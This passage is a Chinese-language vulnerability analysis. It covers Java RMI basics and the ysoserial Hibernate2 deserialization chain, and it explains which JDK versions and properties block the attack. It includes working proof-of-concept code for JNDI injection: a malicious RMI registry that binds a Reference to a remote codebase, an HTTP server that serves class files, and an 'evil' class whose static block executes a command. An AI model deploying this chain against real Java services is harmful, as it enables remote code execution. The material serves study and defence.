RMITestInterface是一个公开接口，就像上一节所讲的，底层生成的代理类是需要实现该接口的,此公共接口一定要继承java.rmi.Remote接口，否则编译时会报错，以下是RMITestInterface的代码,
    public interface RMITestInterface extends Remote {
        public String sayHello(String name)throws RemoteException;
    }
我们在RMIClientTest类中发起远程方法调用的请求，以下是RMIClientTest的代码
    public class RMIClientTest {
        public static void main(String[] args) {
            try{
               /** Registry registry = LocateRegistry.getRegistry("localhost",1099);
                RMITestInterface rmiTestInterface = (RMITestInterface) registry.lookup("RMIClientTestImpl");*/
                RMITestInterface rmiTestInterface = (RMITestInterface) Naming.lookup("rmi://localhost:1099/RMITestInterfaceImpl");
                /**Naming.lookup帮忙封装了上面的两个步骤，将两步合成一步了，原本要写两行代码现在只要一行就行了*/
                System.out.println(rmiTestInterface.sayHello("World"));
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
接下来就是server端的代码，首先我们看RMITestInterfaceImpl，可以看到该类实现了RMITestInterface接口，同时同学们应该也注意到该类继承了一个UnicastRemoteObject类，在RMI中如果一个类要绑定进行远程方法提供的话有两种方法，一就是继承UnicastRemoteObject类，第二种就是在实例化时通过调用`UnicastRemoteObject.exportObject()`静态方法来实例化该对象。
    public class RMITestInterfaceImpl extends UnicastRemoteObject implements RMITestInterface {
        private static final long serialVersionUID = -6151588688230387192L;
        public int num = 1;
        protected RMITestInterfaceImpl() throws RemoteException {
            super();
        }
        @Override
        public String sayHello(String name) throws RemoteException {
            return "Hello" + name + "^_^";
        }
    }
最后我们来看RMIServerTestImpl类，在该类里我们绑定了一个RMITestInterface对象来进行提供远程方法调用的服务
    public class RMIServerTestImpl {
        public static void main(String[] args) {
            try {
                RMITestInterface rmiTestInterface = new RMITestInterfaceImpl();
                LocateRegistry.createRegistry(1099);
                Naming.rebind("rmi://localhost:1099/RMITestInterfaceImpl",rmiTestInterface);
                System.out.println("Ready");
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
最后我们在client端执行RMIClientTest可得到以下结果
## 4.Hibernate2漏洞原理深度分析
整体漏洞的执行逻辑同Hibernate1并无太大差别，首先看一下ysoserial
Hibernate封装恶意代码的逻辑，这次还是用了和上次一样的脑图，对其中利用到的不同的类进行了修改
除了一开始被封装而且是用来最终执行代码的TemplatesImpl类变成了JdbcRowSetImpl类以外几乎没有什么变化了，也就是说前期的执行调用链是一样的。
为了方便大家理解就再把执行过程从头简述一遍。
首先反序列化我们最终封装完成的HashMap对象，自然会调用HashMap的readObject()方法,然后在readObject()方法的末尾有一个for循环，
由脑图可知这里的key和value对象存储的是同一个Type对象
接下来在`putForCreate()`方法里又调用的`hash()`方法
最终嵌套执行到BasicPropertyAccessor$BasicGetter的get()方法。
这里调用了Method.invoke方法，我们看一下method变量和target的具体信息
可以看到最终通过反射的方式调用了`JdbcRowSetImpl.getDatabaseMetaData()`方法,漏洞触发真正的重点从这里才开始和ysoserial
Hibernate1有所不同。
我们跟进getDatabaseMetaData()方法，看到该方法同时调用了自身的connect方法，我们继续跟进
`Var1.lookup(this.getDataSourceName()`就是触发远程代码执行的罪魁祸首
但这么说大家肯定有人会不理解，为何这个函数会造成代码执行。
首先我们先看这个var1，var1是一个InitialContext对象，存在于javax.naming这个包中
那么javax.naming这个包又是干什么的？我们百度一下就可以知道，这个包就是我们常听到的一个概念JNDI
关于JNDI的基础概念就不再过多赘述了
正如第3节内容所讲的RMI远程方法调用一样，JNDI功能中的一部分就是帮我们又封装了一下RMI，从而可以让我们更方便的实现远程方法调用。
下面用代码来复现这个漏洞的原理
首先是jndi client端
    public class JndiClientTest {
        public static void main(String[] args) throws NamingException {
            Context ctx = new InitialContext();
            ctx.lookup("rmi://127.0.0.1:9999/evil");
            System.out.println(System.getProperty("java.version"));
        }
    }
然后是一个恶意server端
    public class RMIServer1 {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(9999);
            System.out.println("java RMI registry created. port on 9999...");
            Reference reference = new Reference("ExportObject", "com.test.remoteclass.evil", "http://127.0.0.1:8000/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
        }
    }
紧接着是一个用来提供恶意类加载的一个简易http Server
    public class HttpServer implements HttpHandler {
        @Override
        public void handle(HttpExchange httpExchange) {
            try {
                System.out.println("new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());
                InputStream inputStream = HttpServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                while (inputStream.available() > 0) {
                    byteArrayOutputStream.write(inputStream.read());
                }
                byte[] bytes = byteArrayOutputStream.toByteArray();
                httpExchange.sendResponseHeaders(200, bytes.length);
                httpExchange.getResponseBody().write(bytes);
                httpExchange.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) throws IOException {
            com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(8000), 0);
            System.out.println("String HTTP Server on port: 8000");
            httpServer.createContext("/", new HttpServer());
            httpServer.setExecutor(null);
            httpServer.start();
        }
    }
最后就是我们包含有恶意代码的类了
    public class evil implements ObjectFactory, Serializable {
        private static final long serialVersionUID = 4474289574195395731L;
        static {
            try {
                exec("open /Applications/Calculator.app");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void exec(String cmd) throws Exception {
            String sb = "";
            BufferedInputStream in = new                BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
            in.close();
        }
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
            return null;
        }
    }
可以看到在静态代码块中写有我们要执行的命令
我们先启动server端和http server。然后运行client端就可以出发命令执行
这是为什么呢？在第三节中我们简单介绍了RMI，RMI可以进行远程方法调用，RMI还可以进行动态类加载，即可以从一个远程服务器`http://`、`ftp://`、`file://`等形式动态加载一个.class文件到本地然后进行操作。但是这种RMI动态类加载的限制极大。有以下要求
  1. 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
  2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
我们使用JNDI同样可以进行动态类加载，而且限制相比于使用RMI要小很多。在jdk1.7.0_21版本我们可以不做任何配置直接进行远程class的加载。
但当jdk版本大于等于JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性
com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。
我们更换jdk版本演示一下，可以看到jdk版本为`1.8.0._22`时会抛出`com.sun.jndi.rmi.object.trustURLCodebase`
为flase的异常
至此 ysoserial Hibernate2 漏洞原理分析完毕，感谢观看。
## 5.总结
此次漏洞利用的思路相较于之前的Hibernate1
主要变化在最终触发命令执行的类由TemplatesImpl类变成了JdbcRowSetImpl类，最终执行漏洞方式又由加载本地通过动态字节码生成的类从而触发其静态代码块中的恶意代码换成了通过RMI+JNDI+Reference,
然后最终由`lookup()`方法动态加载一个远程class文件从而触发其静态代码块中的恶意代码。
* * *